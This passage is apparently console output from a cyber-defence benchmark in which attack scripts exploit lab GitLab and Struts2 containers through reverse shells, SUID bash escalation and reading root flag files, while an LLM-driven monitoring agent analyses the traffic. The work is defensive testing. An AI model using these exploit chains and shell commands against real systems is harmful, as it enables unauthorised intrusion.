      "GITLAB >> /usr/bin/chsh\n",
      "GITLAB >> /usr/bin/passwd\n",
      "GITLAB >> /usr/bin/gpasswd\n",
      "GITLAB >> /usr/bin/sudo\n",
      "GITLAB >> /usr/lib/openssh/ssh-keysign\n",
      "GITLAB >> bash-4.4$\n",
      "GITLAB >> [>] Executing: /bin/bash -p\n",
      "[ATTACK-2] GITLAB >> [<] Response:\n",
      "GITLAB >> /bin/bash -p\n",
      "GITLAB >> \n",
      "GITLAB >> [>] Executing: cat /root/root.txt\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:Attack script completed before timeout.\n",
      "INFO:benchmark.Orchestrator:=== Phase: MONITORING_ACCUMULATION ===\n",
      "INFO:benchmark.Orchestrator:Accumulating monitoring data for 3s...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[ATTACK-2] GITLAB >> [<] Response:\n",
      "GITLAB >> flag{root_access}\n",
      "GITLAB >> \n",
      "GITLAB >> [*] Listener closed\n",
      "[ATTACK-2] \n",
      "=== 🏁 Flags Summary ===\n",
      "GITLAB: flag{user_access}\n",
      "GITLAB: flag{root_access}\n",
      "[*] Exploit executed successfully\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:=== Phase: AGENT_ANALYSIS ===\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Executing agent for epoch 2\n",
      "Loaded 1 recent iterations from episodic memory.\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "WARNING:tools:CRITICAL: 12 command execution attempts detected!\n",
      "WARNING:tools:  Command from 172.20.0.5: Command execution: /bin/bash\n",
      "WARNING:tools:  Command from 172.20.0.5: Direct system command execution\n",
      "WARNING:tools:  Command from 172.20.0.5: Command execution: /bin/bash\n",
      "WARNING:tools:ALERT: 6 packets contain command execution patterns!\n",
      "WARNING:nodes:Security events: Found 12 command execution attempts from 3 threat IPs\n",
      "WARNING:nodes:Compressed packets: Found 14/500 packets with threats\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Analyzing packets and verifying detected threats...\n",
      "Processing 2 chunks for comprehensive analysis...\n",
      "Analyzing chunk 1/2...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Analyzing chunk 2/2...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "INFO:benchmark.Orchestrator:=== Phase: FIREWALL_UPDATE_WAIT ===\n",
      "INFO:benchmark.Orchestrator:Waiting 1s for firewall updates...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Memory: Iteration saved with ID iteration_2. Total iterations: 2\n",
      "Performing complete cleanup before ending iteration...\n",
      "Flushing all messages and resetting state for next iteration\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:=== Phase: METRICS_COLLECTION ===\n",
      "INFO:benchmark.Orchestrator:=== Phase: EPOCH_COMPLETE ===\n",
      "INFO:benchmark.Orchestrator:Saved epoch results to benchmark_results/20250627_122023/epoch_002.json\n",
      "INFO:benchmark.Orchestrator:Waiting 3s before next epoch...\n",
      "INFO:benchmark.Orchestrator:\n",
      "============================================================\n",
      "INFO:benchmark.Orchestrator:EPOCH 3 STARTING\n",
      "INFO:benchmark.Orchestrator:============================================================\n",
      "\n",
      "INFO:benchmark.Orchestrator:=== Phase: INITIALIZATION ===\n",
      "INFO:benchmark.Orchestrator:=== Phase: ATTACK_EXECUTION ===\n",
      "INFO:benchmark.Orchestrator:Starting attacker script with a fallback timeout of 300s...\n",
      "INFO:benchmark.Orchestrator:Attack script running with a fallback timeout of 300s...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[ATTACK-3] [*] Attacker IP address: 192.168.100.2\n",
      "[*] Launching exploit manager...\n",
      "[*] Scanning 172.20.0.0/27 for open ports...\n",
      "[ATTACK-3] [+] Host 172.20.0.6 has open ports: [('80', 'http')]\n",
      "[*] Checking port 80 for GitLab...\n",
      "[ATTACK-3] [*] Checking port 80 for Struts...\n",
      "[ATTACK-3] Checking if version is vulnerable: 13.12.3\n",
      "\n",
      "[+] Detected vulnerable services:\n",
      "\n",
      "[ATTACK-3] Service    Target        Port  Path                  Version\n",
      "---------  ----------  ------  --------------------  ---------\n",
      "GITLAB     172.20.0.6      80  http://172.20.0.6:80  13.12.3\n",
      "\n",
      "[ATTACK-3] [>>>] Launching GitLab exploit against http://172.20.0.6:80 (version: 13.12.3)\n",
      "[ATTACK-3] GITLAB >> ['/attacker/scripts/gitlab/gitlab_exploit.py', 'http://172.20.0.6:80', '192.168.100.2']\n",
      "GITLAB >> [*] Starting scan and exploit chain...\n",
      "GITLAB >> [*] Starting network listener script\n",
      "[ATTACK-3] GITLAB >> [*] Waiting 5 seconds before triggering the connection...\n",
      "[ATTACK-3] GITLAB >> [*] Setting up listener on 0.0.0.0:9001\n",
      "GITLAB >> [*] Listening on port 9001...\n",
      "[ATTACK-3] GITLAB >> [*] Triggering connection to the listener...\n",
      "[ATTACK-3] GITLAB >> [*] Connection triggered. Check your listener.\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:benchmark.Orchestrator:Attack did not finish in time. Proceeding after timeout fallback.\n",
      "INFO:benchmark.Orchestrator:=== Phase: MONITORING_ACCUMULATION ===\n",
      "INFO:benchmark.Orchestrator:Accumulating monitoring data for 3s...\n",
      "INFO:benchmark.Orchestrator:=== Phase: AGENT_ANALYSIS ===\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Executing agent for epoch 3\n",
      "Loaded 2 recent iterations from episodic memory.\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Analyzing packets and verifying detected threats...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "INFO:benchmark.Orchestrator:=== Phase: FIREWALL_UPDATE_WAIT ===\n",
      "INFO:benchmark.Orchestrator:Waiting 1s for firewall updates...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Memory: Iteration saved with ID iteration_3. Total iterations: 3\n",
      "Performing complete cleanup before ending iteration...\n",
      "Flushing all messages and resetting state for next iteration\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:=== Phase: METRICS_COLLECTION ===\n",
      "INFO:benchmark.Orchestrator:=== Phase: EPOCH_COMPLETE ===\n",
      "INFO:benchmark.Orchestrator:Saved epoch results to benchmark_results/20250627_122023/epoch_003.json\n",
      "INFO:benchmark.Orchestrator:Waiting 3s before next epoch...\n",
      "INFO:benchmark.Orchestrator:\n",
      "============================================================\n",
      "INFO:benchmark.Orchestrator:EPOCH 4 STARTING\n",
      "INFO:benchmark.Orchestrator:============================================================\n",
      "\n",
      "INFO:benchmark.Orchestrator:=== Phase: INITIALIZATION ===\n",
      "INFO:benchmark.Orchestrator:=== Phase: ATTACK_EXECUTION ===\n",
      "INFO:benchmark.Orchestrator:Starting attacker script with a fallback timeout of 300s...\n",
      "INFO:benchmark.Orchestrator:Attack script running with a fallback timeout of 300s...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[ATTACK-4] [*] Attacker IP address: 192.168.100.2\n",
      "[*] Launching exploit manager...\n",
      "[*] Scanning 172.20.0.0/27 for open ports...\n",
      "[ATTACK-4] [+] Host 172.20.0.2 has open ports: [('8080', 'http-proxy')]\n",
      "[*] Checking port 8080 for GitLab...\n",
      "[ATTACK-4] [*] Checking port 8080 for Struts...\n",
      "[ATTACK-4] Testing path: struts-showcase\n",
      "[ATTACK-4] Testing path: examples\n",
      "[ATTACK-4] Testing path: struts-examples\n",
      "[ATTACK-4] Testing path: struts2-examples\n",
      "[ATTACK-4] Testing path: struts2-showcase\n",
      "Vulnerable path detected: struts2-showcase\n",
      "[ATTACK-4] [+] Host 172.20.0.6 has open ports: [('80', 'http')]\n",
      "[*] Checking port 80 for GitLab...\n",
      "[ATTACK-4] [*] Checking port 80 for Struts...\n",
      "[ATTACK-4] Checking if version is vulnerable: 13.12.3\n",
      "\n",
      "[+] Detected vulnerable services:\n",
      "\n",
      "[ATTACK-4] Service    Target        Port  Path                  Version\n",
      "---------  ----------  ------  --------------------  ---------\n",
      "STRUTS     172.20.0.2    8080  struts2-showcase\n",
      "GITLAB     172.20.0.6      80  http://172.20.0.6:80  13.12.3\n",
      "\n",
      "[ATTACK-4] [>>>] Launching Struts exploit against 172.20.0.2:8080/struts2-showcase[ATTACK-4] \n",
      "[>>>] Launching GitLab exploit against http://172.20.0.6:80 (version: 13.12.3)\n",
      "[ATTACK-4] GITLAB >> ['/attacker/scripts/gitlab/gitlab_exploit.py', 'http://172.20.0.6:80', '192.168.100.2']\n",
      "GITLAB >> [*] Starting scan and exploit chain...\n",
      "GITLAB >> [*] Starting network listener script\n",
      "[ATTACK-4] GITLAB >> [*] Waiting 5 seconds before triggering the connection...[*] Setting up listener on 0.0.0.0:9001\n",
      "GITLAB >> \n",
      "GITLAB >> [!] Error in listener: [Errno 98] Address already in use\n",
      "GITLAB >> [*] Listener closed\n",
      "[ATTACK-4] STRUTS >> [+] Starting exploit framework...\n",
      "STRUTS >> [+] Created shell.sh reverse shell script\n",
      "[ATTACK-4] STRUTS >> [+] Using Python-based listener on port 9999[+] HTTP server started on 0.0.0.0:8888\n",
      "STRUTS >> [+] Waiting for servers to start...\n",
      "[ATTACK-4] STRUTS >> \n",
      "[ATTACK-4] STRUTS >> [+] Waiting for incoming connections...\n",
      "[ATTACK-4] STRUTS >> [+] Executing Struts2 exploit...\n",
      "STRUTS >> [+] Sending first request to download shell.sh\n",
      "[ATTACK-4] STRUTS >> [+] Sending second request to execute shell.sh\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:benchmark.Orchestrator:Attack did not finish in time. Proceeding after timeout fallback.\n",
      "INFO:benchmark.Orchestrator:=== Phase: MONITORING_ACCUMULATION ===\n",
      "INFO:benchmark.Orchestrator:Accumulating monitoring data for 3s...\n",
      "INFO:benchmark.Orchestrator:=== Phase: AGENT_ANALYSIS ===\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Executing agent for epoch 4\n",
      "Loaded 3 recent iterations from episodic memory.\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Analyzing packets and verifying detected threats...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "INFO:benchmark.Orchestrator:=== Phase: FIREWALL_UPDATE_WAIT ===\n",
      "INFO:benchmark.Orchestrator:Waiting 1s for firewall updates...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Memory: Iteration saved with ID iteration_4. Total iterations: 4\n",
      "Performing complete cleanup before ending iteration...\n",
      "Flushing all messages and resetting state for next iteration\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:=== Phase: METRICS_COLLECTION ===\n",
      "INFO:benchmark.Orchestrator:=== Phase: EPOCH_COMPLETE ===\n",
      "INFO:benchmark.Orchestrator:Saved epoch results to benchmark_results/20250627_122023/epoch_004.json\n",
      "INFO:benchmark.Orchestrator:Waiting 3s before next epoch...\n",
      "INFO:benchmark.Orchestrator:\n",
      "============================================================\n",
      "INFO:benchmark.Orchestrator:EPOCH 5 STARTING\n",
      "INFO:benchmark.Orchestrator:============================================================\n",
      "\n",
      "INFO:benchmark.Orchestrator:=== Phase: INITIALIZATION ===\n",
      "INFO:benchmark.Orchestrator:=== Phase: ATTACK_EXECUTION ===\n",
      "INFO:benchmark.Orchestrator:Starting attacker script with a fallback timeout of 300s...\n",
      "INFO:benchmark.Orchestrator:Attack script running with a fallback timeout of 300s...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[ATTACK-5] [*] Attacker IP address: 192.168.100.2\n",
      "[*] Launching exploit manager...\n",
      "[*] Scanning 172.20.0.0/27 for open ports...\n",
      "[ATTACK-5] [+] Host 172.20.0.2 has open ports: [('8080', 'http-proxy')]\n",
      "[*] Checking port 8080 for GitLab...\n",
      "[ATTACK-5] [*] Checking port 8080 for Struts...\n",
      "[ATTACK-5] Testing path: struts-showcase\n",
      "[ATTACK-5] Testing path: examples\n",
      "[ATTACK-5] Testing path: struts-examples\n",
      "[ATTACK-5] Testing path: struts2-examples\n",
      "[ATTACK-5] Testing path: struts2-showcase\n",
      "Vulnerable path detected: struts2-showcase\n",
      "[ATTACK-5] [+] Host 172.20.0.6 has open ports: [('80', 'http')]\n",
      "[*] Checking port 80 for GitLab...\n",
      "[ATTACK-5] [*] Checking port 80 for Struts...\n",
      "[ATTACK-5] Checking if version is vulnerable: 13.12.3\n",
      "\n",
      "[+] Detected vulnerable services:\n",
      "\n",
      "[ATTACK-5] Service    Target        Port  Path                  Version\n",
      "---------  ----------  ------  --------------------  ---------\n",
      "STRUTS     172.20.0.2    8080  struts2-showcase\n",
      "GITLAB     172.20.0.6      80  http://172.20.0.6:80  13.12.3\n",
      "\n",
      "[ATTACK-5] [>>>] Launching Struts exploit against 172.20.0.2:8080/struts2-showcase[ATTACK-5] \n",
      "[ATTACK-5] [>>>] Launching GitLab exploit against http://172.20.0.6:80 (version: 13.12.3)\n",
      "[ATTACK-5] GITLAB >> ['/attacker/scripts/gitlab/gitlab_exploit.py', 'http://172.20.0.6:80', '192.168.100.2']\n",
      "GITLAB >> [*] Starting scan and exploit chain...\n",
      "GITLAB >> [*] Starting network listener script\n",
      "[ATTACK-5] GITLAB >> [*] Waiting 5 seconds before triggering the connection...[*] Setting up listener on 0.0.0.0:9001\n",
      "GITLAB >> \n",
      "[ATTACK-5] GITLAB >> [!] Error in listener: [Errno 98] Address already in use\n",
      "GITLAB >> [*] Listener closed\n",
      "[ATTACK-5] STRUTS >> [+] Starting exploit framework...\n",
      "[ATTACK-5] STRUTS >> [+] Created shell.sh reverse shell script\n",
      "[ATTACK-5] STRUTS >> [+] Using Python-based listener on port 9999\n",
      "STRUTS >> [!] Error in listener: [Errno 98] Address already in use\n",
      "STRUTS >> [+] Waiting for servers to start...\n",
      "[ATTACK-5] STRUTS >> [+] Executing Struts2 exploit...\n",
      "STRUTS >> [+] Sending first request to download shell.sh\n",
      "[ATTACK-4] STRUTS >> [+] Serving shell.sh to ('172.20.0.2', 35232)\n",
      "[ATTACK-5] STRUTS >> [+] Sending second request to execute shell.sh\n",
      "[ATTACK-4] STRUTS >> [+] Connection from 172.20.0.2:59644\n",
      "STRUTS >> [*] Sending commands to the shell:\n",
      "STRUTS >> [>] Executing: find / -type f -name 'root.txt' 2>/dev/null\n",
      "[ATTACK-4] STRUTS >> [<] Response:\n",
      "STRUTS >> bash: cannot set terminal process group (1): Inappropriate ioctl for device\n",
      "STRUTS >> bash: no job control in this shell\n",
      "STRUTS >> root@d14d6e00fb8c:/usr/local/tomcat#\n",
      "STRUTS >> <tomcat# find / -type f -name 'root.txt' 2>/dev/null\n",
      "STRUTS >> /root/root.txt\n",
      "STRUTS >> root@d14d6e00fb8c:/usr/local/tomcat#\n",
      "STRUTS >> [>] Executing: cat /root/root.txt\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:Attack script completed before timeout.\n",
      "INFO:benchmark.Orchestrator:=== Phase: MONITORING_ACCUMULATION ===\n",
      "INFO:benchmark.Orchestrator:Accumulating monitoring data for 3s...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[ATTACK-4] STRUTS >> [<] Response:\n",
      "STRUTS >> cat /root/root.txt\n",
      "STRUTS >> flag{second_stage_completed}\n",
      "STRUTS >> root@d14d6e00fb8c:/usr/local/tomcat#\n",
      "[ATTACK-4] STRUTS >> [+] Exploit executed\n",
      "[ATTACK-5] STRUTS >> [+] Exploit executed\n",
      "[ATTACK-4] \n",
      "=== 🏁 Flags Summary ===\n",
      "STRUTS: flag{second_stage_completed}\n",
      "[*] Exploit executed successfully\n",
      "[ATTACK-5] STRUTS >> [ERR] Exception in thread Thread-1 (start_http_server):\n",
      "STRUTS >> [ERR] Traceback (most recent call last):\n",
      "STRUTS >> [ERR] File \"/usr/lib/python3.13/threading.py\", line 1041, in _bootstrap_inner\n",
      "STRUTS >> [ERR] self.run()\n",
      "STRUTS >> [ERR] ~~~~~~~~^^\n",
      "STRUTS >> [ERR] File \"/usr/lib/python3.13/threading.py\", line 992, in run\n",
      "STRUTS >> [ERR] self._target(*self._args, **self._kwargs)\n",
      "STRUTS >> [ERR] ~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n",
      "STRUTS >> [ERR] File \"/attacker/scripts/multi_step/struts_exploit.py\", line 44, in start_http_server\n",
      "STRUTS >> [ERR] with socketserver.TCPServer((\"0.0.0.0\", 8888), handler) as httpd:\n",
      "STRUTS >> [ERR] ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n",
      "STRUTS >> [ERR] File \"/usr/lib/python3.13/socketserver.py\", line 457, in __init__\n",
      "[ATTACK-5] STRUTS >> [ERR] self.server_bind()\n",
      "STRUTS >> [ERR] ~~~~~~~~~~~~~~~~^^\n",
      "[ATTACK-5] STRUTS >> [ERR] File \"/usr/lib/python3.13/socketserver.py\", line 478, in server_bind\n",
      "STRUTS >> [ERR] self.socket.bind(self.server_address)\n",
      "[ATTACK-5] STRUTS >> [ERR] ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^\n",
      "[ATTACK-5] STRUTS >> [ERR] OSError: [Errno 98] Address already in use\n",
      "[ATTACK-5] \n",
      "=== 🏁 Flags Summary ===\n",
      "[*] Exploit executed successfully[ATTACK-5] \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:=== Phase: AGENT_ANALYSIS ===\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Executing agent for epoch 5\n",
      "Loaded 4 recent iterations from episodic memory.\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "WARNING:tools:CRITICAL: 4 command execution attempts detected!\n",
      "WARNING:tools:  Command from 192.168.100.2: Command execution: /bin/bash\n",
      "WARNING:tools:  Command from 192.168.100.2: Direct system command execution\n",
      "WARNING:tools:  Command from 192.168.100.2: Command execution: /bin/bash\n",
      "WARNING:tools:ALERT: 2 packets contain command execution patterns!\n",
      "WARNING:nodes:Security events: Found 4 command execution attempts from 2 threat IPs\n",
      "WARNING:nodes:Compressed packets: Found 14/500 packets with threats\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Analyzing packets and verifying detected threats...\n",
      "Analyzing all threat incidents in single pass...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "INFO:benchmark.Orchestrator:=== Phase: FIREWALL_UPDATE_WAIT ===\n",
      "INFO:benchmark.Orchestrator:Waiting 1s for firewall updates...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Memory: Iteration saved with ID iteration_5. Total iterations: 5\n",
      "Performing complete cleanup before ending iteration...\n",
      "Flushing all messages and resetting state for next iteration\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:=== Phase: METRICS_COLLECTION ===\n",
      "INFO:benchmark.Orchestrator:=== Phase: EPOCH_COMPLETE ===\n",
      "INFO:benchmark.Orchestrator:Saved epoch results to benchmark_results/20250627_122023/epoch_005.json\n",
      "INFO:benchmark.Orchestrator:Waiting 3s before next epoch...\n",
      "INFO:benchmark.Orchestrator:\n",
      "============================================================\n",
      "INFO:benchmark.Orchestrator:EPOCH 6 STARTING\n",
      "INFO:benchmark.Orchestrator:============================================================\n",
      "\n",
      "INFO:benchmark.Orchestrator:=== Phase: INITIALIZATION ===\n",
      "INFO:benchmark.Orchestrator:=== Phase: ATTACK_EXECUTION ===\n",
      "INFO:benchmark.Orchestrator:Starting attacker script with a fallback timeout of 300s...\n",
      "INFO:benchmark.Orchestrator:Attack script running with a fallback timeout of 300s...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[ATTACK-6] [*] Attacker IP address: 192.168.100.2\n",
      "[*] Launching exploit manager...\n",
      "[*] Scanning 172.20.0.0/27 for open ports...\n",
      "[ATTACK-6] [+] Host 172.20.0.6 has open ports: [('80', 'http')]\n",
      "[*] Checking port 80 for GitLab...\n",
      "[ATTACK-6] [*] Checking port 80 for Struts...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:Attack script completed before timeout.\n",
      "INFO:benchmark.Orchestrator:=== Phase: MONITORING_ACCUMULATION ===\n",
      "INFO:benchmark.Orchestrator:Accumulating monitoring data for 3s...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[ATTACK-6] Checking if version is vulnerable: 13.12.3\n",
      "\n",
      "[+] Detected vulnerable services:\n",
      "\n",
      "[ATTACK-6] Service    Target        Port  Path                  Version\n",
      "---------  ----------  ------  --------------------  ---------\n",
      "GITLAB     172.20.0.6      80  http://172.20.0.6:80  13.12.3\n",
      "\n",
      "[ATTACK-6] [>>>] Launching GitLab exploit against http://172.20.0.6:80 (version: 13.12.3)\n",
      "[ATTACK-6] GITLAB >> ['/attacker/scripts/gitlab/gitlab_exploit.py', 'http://172.20.0.6:80', '192.168.100.2']\n",
      "GITLAB >> [*] Starting scan and exploit chain...\n",
      "GITLAB >> [*] Starting network listener script\n",
      "[ATTACK-6] GITLAB >> [*] Waiting 5 seconds before triggering the connection...[*] Setting up listener on 0.0.0.0:9001\n",
      "GITLAB >> \n",
      "GITLAB >> [!] Error in listener: [Errno 98] Address already in use\n",
      "GITLAB >> [*] Listener closed\n",
      "[ATTACK-6] \n",
      "=== 🏁 Flags Summary ===\n",
      "[*] Exploit executed successfully\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:=== Phase: AGENT_ANALYSIS ===\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Executing agent for epoch 6\n",
      "Loaded 5 recent iterations from episodic memory.\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "WARNING:tools:CRITICAL: 4 command execution attempts detected!\n",
      "WARNING:tools:  Command from 192.168.100.2: Command execution: /bin/bash\n",
      "WARNING:tools:  Command from 192.168.100.2: Direct system command execution\n",
      "WARNING:tools:  Command from 192.168.100.2: Command execution: /bin/bash\n",
      "WARNING:nodes:Security events: Found 4 command execution attempts from 2 threat IPs\n",
      "WARNING:nodes:Found 4 threat incidents without payload content:\n",
      "WARNING:nodes:  - 192.168.100.2 -> Command execution: /bin/bash\n",
      "WARNING:nodes:  - 192.168.100.2 -> Direct system command execution\n",
      "WARNING:nodes:  - 192.168.100.2 -> Command execution: /bin/bash\n",
      "WARNING:nodes:  - 192.168.100.2 -> Direct system command execution\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Analyzing packets and verifying detected threats...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "INFO:benchmark.Orchestrator:=== Phase: FIREWALL_UPDATE_WAIT ===\n",
      "INFO:benchmark.Orchestrator:Waiting 1s for firewall updates...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Memory: Iteration saved with ID iteration_6. Total iterations: 6\n",
      "Performing complete cleanup before ending iteration...\n",
      "Flushing all messages and resetting state for next iteration\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:=== Phase: METRICS_COLLECTION ===\n",
      "INFO:benchmark.Orchestrator:=== Phase: EPOCH_COMPLETE ===\n",
      "INFO:benchmark.Orchestrator:Saved epoch results to benchmark_results/20250627_122023/epoch_006.json\n",
      "INFO:benchmark.Orchestrator:Waiting 3s before next epoch...\n",
      "INFO:benchmark.Orchestrator:\n",
      "============================================================\n",
      "INFO:benchmark.Orchestrator:EPOCH 7 STARTING\n",
      "INFO:benchmark.Orchestrator:============================================================\n",
      "\n",
      "INFO:benchmark.Orchestrator:=== Phase: INITIALIZATION ===\n",
      "INFO:benchmark.Orchestrator:=== Phase: ATTACK_EXECUTION ===\n",
      "INFO:benchmark.Orchestrator:Starting attacker script with a fallback timeout of 300s...\n",
      "INFO:benchmark.Orchestrator:Attack script running with a fallback timeout of 300s...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[ATTACK-7] [*] Attacker IP address: 192.168.100.2\n",
      "[*] Launching exploit manager...\n",
      "[*] Scanning 172.20.0.0/27 for open ports...\n",
      "[ATTACK-7] [+] Host 172.20.0.6 has open ports: [('80', 'http')]\n",
      "[*] Checking port 80 for GitLab...\n",
      "[ATTACK-7] [*] Checking port 80 for Struts...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:Attack script completed before timeout.\n",
      "INFO:benchmark.Orchestrator:=== Phase: MONITORING_ACCUMULATION ===\n",
      "INFO:benchmark.Orchestrator:Accumulating monitoring data for 3s...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[ATTACK-7] Checking if version is vulnerable: 13.12.3\n",
      "\n",
      "[+] Detected vulnerable services:\n",
      "\n",
      "[ATTACK-7] Service    Target        Port  Path                  Version\n",
      "---------  ----------  ------  --------------------  ---------\n",
      "GITLAB     172.20.0.6      80  http://172.20.0.6:80  13.12.3\n",
      "\n",
      "[ATTACK-7] [>>>] Launching GitLab exploit against http://172.20.0.6:80 (version: 13.12.3)[ATTACK-7] \n",
      "[ATTACK-7] GITLAB >> ['/attacker/scripts/gitlab/gitlab_exploit.py', 'http://172.20.0.6:80', '192.168.100.2']\n",
      "GITLAB >> [*] Starting scan and exploit chain...\n",
      "GITLAB >> [*] Starting network listener script\n",
      "GITLAB >> [*] Waiting 5 seconds before triggering the connection...[*] Setting up listener on 0.0.0.0:9001\n",
      "GITLAB >> \n",
      "GITLAB >> [!] Error in listener: [Errno 98] Address already in use\n",
      "GITLAB >> [*] Listener closed\n",
      "[ATTACK-7] \n",
      "=== 🏁 Flags Summary ===\n",
      "[*] Exploit executed successfully\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:=== Phase: AGENT_ANALYSIS ===\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Executing agent for epoch 7\n",
      "Loaded 5 recent iterations from episodic memory.\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "Exception ignored in: <urllib3.response.HTTPResponse object at 0x76f9d54307f0>\n",
      "Traceback (most recent call last):\n",
